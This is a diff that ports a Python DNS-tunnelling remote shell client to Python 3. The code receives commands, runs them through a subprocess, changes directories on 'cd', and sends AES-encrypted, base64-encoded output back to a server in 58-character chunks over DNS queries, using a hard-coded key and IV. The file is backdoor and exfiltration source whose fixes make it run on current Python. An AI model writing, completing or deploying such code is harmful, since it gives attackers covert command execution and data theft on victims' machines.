@@ -9,18 +9,18 @@ import re, logging
 from optparse import OptionParser
 
 TLD = 'com'
-NXT_CMD = 'nxt'
+NXT_CMD = 'nxt'.encode()
 ANSWER = ';ANSWER'
 TYPE = 'TXT'
 # REPLACE THIS WITH YOUR OWN KEY AND IV #
-secret = "TyKuwAt5vg1m48z2qYs6cUalHQrDpG0B"
-iv = "1cYGbLz8qN4umT4c"
+secret = "TyKuwAt5vg1m48z2qYs6cUalHQrDpG0B".encode()
+iv = "1cYGbLz8qN4umT4c".encode()
 
 # the block size for the cipher object; must be 16, 24, or 32 for AES
 BLOCK_SIZE = 32
 
 # the character used for padding-
-PADDING = '{'
+PADDING = b'{'
 # one-liner to sufficiently pad the text to be encrypted
 pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
 # encrypt with AES, encode with base64
@@ -28,18 +28,19 @@ EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
 
 # create a CBC cipher object using a random secret and iv
-cipher = AES.new(secret, AES.MODE_CBC, iv)
+cipher_enc = AES.new(secret, AES.MODE_CBC, iv)
+cipher_dec = AES.new(secret, AES.MODE_CBC, iv)
 
 def encrypt(string):
-  encoded = EncodeAES(cipher, string)
+  encoded = EncodeAES(cipher_enc, string)
   return encoded
 
 def decrypt(string):
-  decoded = DecodeAES(cipher, string)
+  decoded = DecodeAES(cipher_dec, string)
   return decoded
 
 # Default connection reset string, b64 encoded:
-nextCommand = base64.b64encode(NXT_CMD)
+nextCommand = base64.b64encode(NXT_CMD).decode()
 
 def formURL(cmd):
   return '{}.{}'.format(cmd, TLD)
@@ -94,7 +95,7 @@ def runCmd(cmd):
   stdoutput = proc.stdout.read() + proc.stderr.read()
 
   # Handle Directory Changes:
-  if re.match('^cd .*', nxtCmd):
+  if re.match('^cd .*', nxtCmd.decode()):
     try:
       directory = nxtCmd.split('cd ')[-1]
       os.chdir(directory)
@@ -113,7 +114,7 @@ def dnsMakeQuery(url, host):
 def sendOutputToServer(output, host):
   send =''
   output_end = len(output)
-  for chunk in output:
+  for chunk in output.decode():
     send += chunk
     output_end -= 1
     # Send 58 charcter chunks:
